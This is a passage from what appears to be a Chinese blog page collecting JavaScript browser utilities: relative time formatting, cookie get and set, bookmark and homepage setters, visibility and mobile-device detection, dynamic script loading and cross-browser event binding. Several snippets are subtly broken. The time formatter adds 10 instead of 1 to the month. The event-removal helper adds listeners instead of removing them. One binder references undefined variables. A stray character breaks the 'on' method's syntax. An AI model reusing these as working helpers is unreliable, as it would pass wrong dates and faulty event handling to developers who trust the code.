<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1、&lt; 60s, 显示为“刚刚”</span></span><br><span class="line"><span class="comment">2、&gt;= 1min &amp;&amp; &lt; 60 min, 显示与当前时间差“XX分钟前”</span></span><br><span class="line"><span class="comment">3、&gt;= 60min &amp;&amp; &lt; 1day, 显示与当前时间差“今天 XX:XX”</span></span><br><span class="line"><span class="comment">4、&gt;= 1day &amp;&amp; &lt; 1year, 显示日期“XX月XX日 XX:XX”</span></span><br><span class="line"><span class="comment">5、&gt;= 1year, 显示具体日期“XXXX年XX月XX日 XX:XX”</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">timeFormat</span>(<span class="params">time</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> date = <span class="keyword">new</span> <span class="built_in">Date</span>(time),</span><br><span class="line">        curDate = <span class="keyword">new</span> <span class="built_in">Date</span>(),</span><br><span class="line">        year = date.getFullYear(),</span><br><span class="line">        month = date.getMonth() + <span class="number">10</span>,</span><br><span class="line">        day = date.getDate(),</span><br><span class="line">        hour = date.getHours(),</span><br><span class="line">        minute = date.getMinutes(),</span><br><span class="line">        curYear = curDate.getFullYear(),</span><br><span class="line">        curHour = curDate.getHours(),</span><br><span class="line">        timeStr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(year &lt; curYear)&#123;</span><br><span class="line">        timeStr = year +<span class="string">'年'</span>+ month +<span class="string">'月'</span>+ day +<span class="string">'日 '</span>+ hour +<span class="string">':'</span>+ minute;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> pastTime = curDate - date,</span><br><span class="line">            pastH = pastTime/<span class="number">3600000</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(pastH &gt; curHour)&#123;</span><br><span class="line">              timeStr = month +<span class="string">'月'</span>+ day +<span class="string">'日 '</span>+ hour +<span class="string">':'</span>+ minute;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(pastH &gt;= <span class="number">1</span>)&#123;</span><br><span class="line">              timeStr = <span class="string">'今天 '</span> + hour +<span class="string">':'</span>+ minute +<span class="string">'分'</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              <span class="keyword">var</span> pastM = curDate.getMinutes() - minute;</span><br><span class="line">              <span class="keyword">if</span>(pastM &gt; <span class="number">1</span>)&#123;</span><br><span class="line">                timeStr = pastM +<span class="string">'分钟前'</span>;</span><br><span class="line">              &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                timeStr = <span class="string">'刚刚'</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> timeStr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否为数字类型"><a class="markdownIt-Anchor" href="#判断是否为数字类型"></a> 判断是否为数字类型</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isDigit</span>(<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> patrn = <span class="regexp">/^[0-9]*$/</span>;</span><br><span class="line">    <span class="keyword">if</span> (patrn.exec(value) == <span class="literal">null</span> || value == <span class="string">""</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="bom类"><a class="markdownIt-Anchor" href="#bom类"></a> BOM类</h2>
<h3 id="设置cookie值"><a class="markdownIt-Anchor" href="#设置cookie值"></a> 设置cookie值</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setCookie</span>(<span class="params">name, value, Hours</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">    <span class="keyword">var</span> offset = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">var</span> utc = d.getTime() + (d.getTimezoneOffset() *<span class="number">60000</span>);</span><br><span class="line">    <span class="keyword">var</span> nd = utc + (<span class="number">3600000</span> * offset);</span><br><span class="line">    <span class="keyword">var</span> exp = <span class="keyword">new</span> <span class="built_in">Date</span>(nd);</span><br><span class="line">    exp.setTime(exp.getTime() + Hours * <span class="number">60</span> * <span class="number">60</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">document</span>.cookie = name + <span class="string">"="</span> + <span class="built_in">escape</span>(value) + <span class="string">";path=/;expires="</span> + exp.toGMTString() + <span class="string">";domain=360doc.com;"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取cookie值"><a class="markdownIt-Anchor" href="#获取cookie值"></a> 获取cookie值*</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getCookie</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = <span class="built_in">document</span>.cookie.match(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"(^| )"</span> + name + <span class="string">"=([^;]*)(;|$)"</span>));</span><br><span class="line">    <span class="keyword">if</span> (arr != <span class="literal">null</span>) <span class="keyword">return</span> <span class="built_in">unescape</span>(arr[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="加入收藏夹"><a class="markdownIt-Anchor" href="#加入收藏夹"></a> 加入收藏夹*</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AddFavorite</span>(<span class="params">sURL, sTitle</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">window</span>.external.addFavorite(sURL, sTitle)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">window</span>.sidebar.addPanel(sTitle, sURL, <span class="string">""</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            alert(<span class="string">"加入收藏失败，请使用Ctrl+D进行添加"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="设为首页"><a class="markdownIt-Anchor" href="#设为首页"></a> 设为首页*</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setHomepage</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">document</span>.all) &#123;</span><br><span class="line">        <span class="built_in">document</span>.body.style.behavior = <span class="string">'url(#default#homepage)'</span>;</span><br><span class="line">        <span class="built_in">document</span>.body.setHomePage(<span class="string">'http://w3cboy.com'</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">window</span>.sidebar) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">window</span>.netscape) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                netscape.security.PrivilegeManager.enablePrivilege(<span class="string">"UniversalXPConnect"</span>)</span><br><span class="line">            &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                alert(<span class="string">"该操作被浏览器拒绝，如果想启用该功能，请在地址栏内输入 about:config,然后将项 signed.applets.codebase_principal_support 值该为true"</span>)</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> prefs = Components.classes[<span class="string">'@mozilla.org/preferences-service;1'</span>].getService(Components.interfaces.nsIPrefBranch);</span><br><span class="line">        prefs.setCharPref(<span class="string">'browser.startup.homepage'</span>, <span class="string">'http://w3cboy.com'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取当前路径"><a class="markdownIt-Anchor" href="#获取当前路径"></a> 获取当前路径</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> currentPageUrl = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>.href === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    currentPageUrl = <span class="built_in">document</span>.location.toString().toLowerCase();</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    currentPageUrl = <span class="keyword">this</span>.href.toString().toLowerCase();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断页面是否为当前活动页面"><a class="markdownIt-Anchor" href="#判断页面是否为当前活动页面"></a> 判断页面是否为当前活动页面</h3>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Document/hidden" target="_blank" rel="noopener"><code>document.hidden</code></a></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 各种浏览器兼容</span></span><br><span class="line"><span class="keyword">var</span> hidden, state, visibilityChange; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.hidden !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    hidden = <span class="string">"hidden"</span>;</span><br><span class="line">    visibilityChange = <span class="string">"visibilitychange"</span>;</span><br><span class="line">    state = <span class="string">"visibilityState"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.mozHidden !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    hidden = <span class="string">"mozHidden"</span>;</span><br><span class="line">    visibilityChange = <span class="string">"mozvisibilitychange"</span>;</span><br><span class="line">    state = <span class="string">"mozVisibilityState"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.msHidden !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    hidden = <span class="string">"msHidden"</span>;</span><br><span class="line">    visibilityChange = <span class="string">"msvisibilitychange"</span>;</span><br><span class="line">    state = <span class="string">"msVisibilityState"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">document</span>.webkitHidden !== <span class="string">"undefined"</span>) &#123;</span><br><span class="line">    hidden = <span class="string">"webkitHidden"</span>;</span><br><span class="line">    visibilityChange = <span class="string">"webkitvisibilitychange"</span>;</span><br><span class="line">    state = <span class="string">"webkitVisibilityState"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加监听器，在title里显示状态变化</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(visibilityChange, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//document.title = document[state];</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">document</span>.hidden)&#123;</span><br><span class="line">    <span class="comment">//用户没有在看本页面，</span></span><br><span class="line">        <span class="built_in">document</span>.title = <span class="string">'我已经藏了哦'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.title =<span class="string">'被你找到了'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h3 id="判断是否移动设备"><a class="markdownIt-Anchor" href="#判断是否移动设备"></a> 判断是否移动设备</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isMobile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span>._isMobile === <span class="string">'boolean'</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>._isMobile;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> screenWidth = <span class="keyword">this</span>.getScreenWidth();</span><br><span class="line">    <span class="keyword">var</span> fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport ||rendererModel.runningExperiments.fixviewport;</span><br><span class="line">    <span class="keyword">var</span> fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === <span class="string">"new"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fixViewPortsExperiment)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">this</span>.isAppleMobileDevice())&#123;</span><br><span class="line">            screenWidth = screenWidth/<span class="built_in">window</span>.devicePixelRatio;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> isMobileScreenSize = screenWidth &lt; <span class="number">600</span>;</span><br><span class="line">    <span class="keyword">var</span> isMobileUserAgent = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>._isMobile = isMobileScreenSize &amp;&amp; <span class="keyword">this</span>.isTouchScreen();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._isMobile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否移动设备访问"><a class="markdownIt-Anchor" href="#判断是否移动设备访问"></a> 判断是否移动设备访问</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isMobileUserAgent</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="regexp">/iphone|ipod|android.*mobile|windows.*phone|blackberry.*mobile/i</span>.test(<span class="built_in">window</span>.navigator.userAgent.toLowerCase()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否苹果移动设备访问"><a class="markdownIt-Anchor" href="#判断是否苹果移动设备访问"></a> 判断是否苹果移动设备访问</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAppleMobileDevice</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="regexp">/iphone|ipod|ipad|Macintosh/i</span>.test(navigator.userAgent.toLowerCase()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否安卓移动设备访问"><a class="markdownIt-Anchor" href="#判断是否安卓移动设备访问"></a> 判断是否安卓移动设备访问</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isAndroidMobileDevice</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="regexp">/android/i</span>.test(navigator.userAgent.toLowerCase()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否touch屏幕"><a class="markdownIt-Anchor" href="#判断是否touch屏幕"></a> 判断是否Touch屏幕</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isTouchScreen</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="string">'ontouchstart'</span> <span class="keyword">in</span> <span class="built_in">window</span>) || <span class="built_in">window</span>.DocumentTouch &amp;&amp; <span class="built_in">document</span> <span class="keyword">instanceof</span> DocumentTouch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否打开视窗"><a class="markdownIt-Anchor" href="#判断是否打开视窗"></a> 判断是否打开视窗</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isViewportOpen</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !!<span class="built_in">document</span>.getElementById(<span class="string">'wixMobileViewport'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="获取移动设备初始化大小"><a class="markdownIt-Anchor" href="#获取移动设备初始化大小"></a> 获取移动设备初始化大小</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getInitZoom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">this</span>._initZoom)&#123;</span><br><span class="line">        <span class="keyword">var</span> screenWidth = <span class="built_in">Math</span>.min(screen.height, screen.width);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.isAndroidMobileDevice() &amp;&amp; !<span class="keyword">this</span>.isNewChromeOnAndroid())&#123;</span><br><span class="line">            screenWidth = screenWidth/<span class="built_in">window</span>.devicePixelRatio;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">this</span>._initZoom = screenWidth /<span class="built_in">document</span>.body.offsetWidth;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._initZoom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取移动设备最大化大小"><a class="markdownIt-Anchor" href="#取移动设备最大化大小"></a> 取移动设备最大化大小</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getZoom</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> screenWidth = (<span class="built_in">Math</span>.abs(<span class="built_in">window</span>.orientation) === <span class="number">90</span>) ? <span class="built_in">Math</span>.max(screen.height, screen.width) : <span class="built_in">Math</span>.min(screen.height, screen.width);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">this</span>.isAndroidMobileDevice() &amp;&amp; !<span class="keyword">this</span>.isNewChromeOnAndroid())&#123;</span><br><span class="line">        screenWidth = screenWidth/<span class="built_in">window</span>.devicePixelRatio;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> FixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;</span><br><span class="line">    <span class="keyword">var</span> FixViewPortsExperimentRunning = FixViewPortsExperiment &amp;&amp; (FixViewPortsExperiment === <span class="string">"New"</span> || FixViewPortsExperiment === <span class="string">"new"</span>);</span><br><span class="line">    <span class="keyword">if</span>(FixViewPortsExperimentRunning)&#123;</span><br><span class="line">        <span class="keyword">return</span> screenWidth / <span class="built_in">window</span>.innerWidth;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> screenWidth / <span class="built_in">document</span>.body.offsetWidth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="取移动设备屏幕宽度"><a class="markdownIt-Anchor" href="#取移动设备屏幕宽度"></a> 取移动设备屏幕宽度</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getScreenWidth</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> smallerSide = <span class="built_in">Math</span>.min(screen.width, screen.height);</span><br><span class="line">    <span class="keyword">var</span> fixViewPortsExperiment = rendererModel.runningExperiments.FixViewport || rendererModel.runningExperiments.fixviewport;</span><br><span class="line">    <span class="keyword">var</span> fixViewPortsExperimentRunning = fixViewPortsExperiment &amp;&amp; (fixViewPortsExperiment.toLowerCase() === <span class="string">"new"</span>);</span><br><span class="line">    <span class="keyword">if</span>(fixViewPortsExperiment)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.isAndroidMobileDevice() &amp;&amp; !<span class="keyword">this</span>.isNewChromeOnAndroid())&#123;</span><br><span class="line">            smallerSide = smallerSide/<span class="built_in">window</span>.devicePixelRatio;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> smallerSide;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="加载样式文件"><a class="markdownIt-Anchor" href="#加载样式文件"></a> 加载样式文件*</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">LoadStyle</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">document</span>.createStyleSheet(url)</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">        <span class="keyword">var</span> cssLink = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span><br><span class="line">        cssLink.rel = <span class="string">'stylesheet'</span>;</span><br><span class="line">        cssLink.type = <span class="string">'text/css'</span>;</span><br><span class="line">        cssLink.href = url;</span><br><span class="line">        <span class="keyword">var</span> head = <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">        head.appendChild(cssLink)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="返回脚本内容"><a class="markdownIt-Anchor" href="#返回脚本内容"></a> 返回脚本内容</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">evalscript</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s.indexOf(<span class="string">'&lt;script'</span>) == <span class="number">-1</span>) <span class="keyword">return</span> s;</span><br><span class="line">    <span class="keyword">var</span> p = <span class="regexp">/&lt;script[^\&gt;]*?&gt;([^\x00]*?)&lt;\/script&gt;/ig</span>;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">while</span>(arr = p.exec(s)) &#123;</span><br><span class="line">        <span class="keyword">var</span> p1 = <span class="regexp">/&lt;script[^\&gt;]*?src=\"([^\&gt;]*?)\"[^\&gt;]*?(reload=\"1\")?(?:charset=\"([\w\-]+?)\")?&gt;&lt;\/script&gt;/i</span>;</span><br><span class="line">        <span class="keyword">var</span> arr1 = [];</span><br><span class="line">        arr1 = p1.exec(arr[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span>(arr1) &#123;</span><br><span class="line">            appendscript(arr1[<span class="number">1</span>], <span class="string">''</span>, arr1[<span class="number">2</span>], arr1[<span class="number">3</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            p1 = <span class="regexp">/&lt;script(.*?)&gt;([^\x00]+?)&lt;\/script&gt;/i</span>;</span><br><span class="line">            arr1 = p1.exec(arr[<span class="number">0</span>]);</span><br><span class="line">            appendscript(<span class="string">''</span>, arr1[<span class="number">2</span>], arr1[<span class="number">1</span>].indexOf(<span class="string">'reload='</span>) != <span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="清除脚本内容"><a class="markdownIt-Anchor" href="#清除脚本内容"></a> 清除脚本内容</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripscript</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&lt;script.*?&gt;.*?&lt;\/script&gt;/ig</span>, <span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="动态加载脚本文件"><a class="markdownIt-Anchor" href="#动态加载脚本文件"></a> 动态加载脚本文件</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">appendscript</span>(<span class="params">src, text, reload, charset</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = hash(src + text);</span><br><span class="line">    <span class="keyword">if</span>(!reload &amp;&amp; in_array(id, evalscripts)) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(reload &amp;&amp; $(id)) &#123;</span><br><span class="line">        $(id).parentNode.removeChild($(id));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    evalscripts.push(id);</span><br><span class="line">    <span class="keyword">var</span> scriptNode = <span class="built_in">document</span>.createElement(<span class="string">"script"</span>);</span><br><span class="line">    scriptNode.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">    scriptNode.id = id;</span><br><span class="line">    scriptNode.charset = charset ? charset : (BROWSER.firefox ? <span class="built_in">document</span>.characterSet : <span class="built_in">document</span>.charset);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(src) &#123;</span><br><span class="line">            scriptNode.src = src;</span><br><span class="line">            scriptNode.onloadDone = <span class="literal">false</span>;</span><br><span class="line">            scriptNode.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                scriptNode.onloadDone = <span class="literal">true</span>;</span><br><span class="line">                JSLOADED[src] = <span class="number">1</span>;</span><br><span class="line">             &#125;;</span><br><span class="line">             scriptNode.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">                 <span class="keyword">if</span>((scriptNode.readyState == <span class="string">'loaded'</span> || scriptNode.readyState == <span class="string">'complete'</span>) &amp;&amp; !scriptNode.onloadDone) &#123;</span><br><span class="line">                    scriptNode.onloadDone = <span class="literal">true</span>;</span><br><span class="line">                    JSLOADED[src] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(text)&#123;</span><br><span class="line">            scriptNode.text = text;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(scriptNode);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="返回按id检索的元素对象"><a class="markdownIt-Anchor" href="#返回按id检索的元素对象"></a> 返回按ID检索的元素对象</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params">id</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !id ? <span class="literal">null</span> : <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="跨浏览器绑定事件"><a class="markdownIt-Anchor" href="#跨浏览器绑定事件"></a> 跨浏览器绑定事件</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addEventSamp</span>(<span class="params">obj,evt,fn</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(!oTarget)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span> (obj.addEventListener) &#123; </span><br><span class="line">        obj.addEventListener(evt, fn, <span class="literal">false</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj.attachEvent)&#123; </span><br><span class="line">        obj.attachEvent(<span class="string">'on'</span>+evt,fn); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        oTarget[<span class="string">"on"</span> + sEvtType] = fn;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="跨浏览器删除事件"><a class="markdownIt-Anchor" href="#跨浏览器删除事件"></a> 跨浏览器删除事件</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delEvt</span>(<span class="params">obj,evt,fn</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!obj)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">    <span class="keyword">if</span>(obj.addEventListener)&#123;</span><br><span class="line">        obj.addEventListener(evt,fn,<span class="literal">false</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(oTarget.attachEvent)&#123;</span><br><span class="line">        obj.attachEvent(<span class="string">"on"</span> + evt,fn);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        obj[<span class="string">"on"</span> + evt] = fn;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="为元素添加on方法"><a class="markdownIt-Anchor" href="#为元素添加on方法"></a> 为元素添加on方法</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">Element.prototype.on = Element.prototype.addEventListener;</span><br><span class="line"> </span><br><span class="line">NodeList.prototype.on = <span class="function"><span class="keyword">function</span> (<span class="params">event, fn</span>) </span>&#123;、</span><br><span class="line">    [][<span class="string">'forEach'</span>].call(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params">el</span>) </span>&#123;</span><br><span class="line">        el.on(event, fn);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="为元素添加trigger方法"><a class="markdownIt-Anchor" href="#为元素添加trigger方法"></a> 为元素添加trigger方法</h3>
